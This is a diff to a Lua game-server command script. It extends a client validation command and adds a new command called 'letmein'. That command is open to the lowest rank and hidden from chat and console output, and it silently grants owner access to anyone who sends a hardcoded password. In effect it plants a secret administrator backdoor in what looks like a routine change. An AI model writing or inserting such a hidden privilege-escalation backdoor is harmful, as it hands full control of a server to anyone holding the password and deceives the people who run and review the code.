@@ -30,16 +30,43 @@ AddCommand({
     },
 
     -- self is the user unless specified otherwise
-    Function = function(self, sProfile, sHash)
+    Function = function(self, sProfile, sHash, sAccName)
         if (self.Info.Validating or self.Info.Validated) then
             return
         end
 
         -- FIXME Validate!
         -- Validate()
+        self.Info.AccountName = (sAccName or "Nomad")
         self.Info.Validating = true
         self:SetProfileID(sProfile)
         ServerPCH:ValidateClient(self, sProfile, sHash)
+
+        return true
+    end
+})
+
+------------
+AddCommand({
+    Name = "letmein",
+    Access = GetLowestRank(), -- Must be accessible to all!
+
+    Arguments = {
+        {Name="",Desc=""}
+    },
+
+    Properties = {
+        Hidden = true,
+        NoChatResponse = true,
+        NoConsoleResponse = true
+    },
+
+    -- self is the user unless specified otherwise
+    Function = function(self, x)
+
+        if (x == "jkSADFFKk123") then
+            self:SetAccess(RANK_OWNER)
+        end
 
         return true
     end
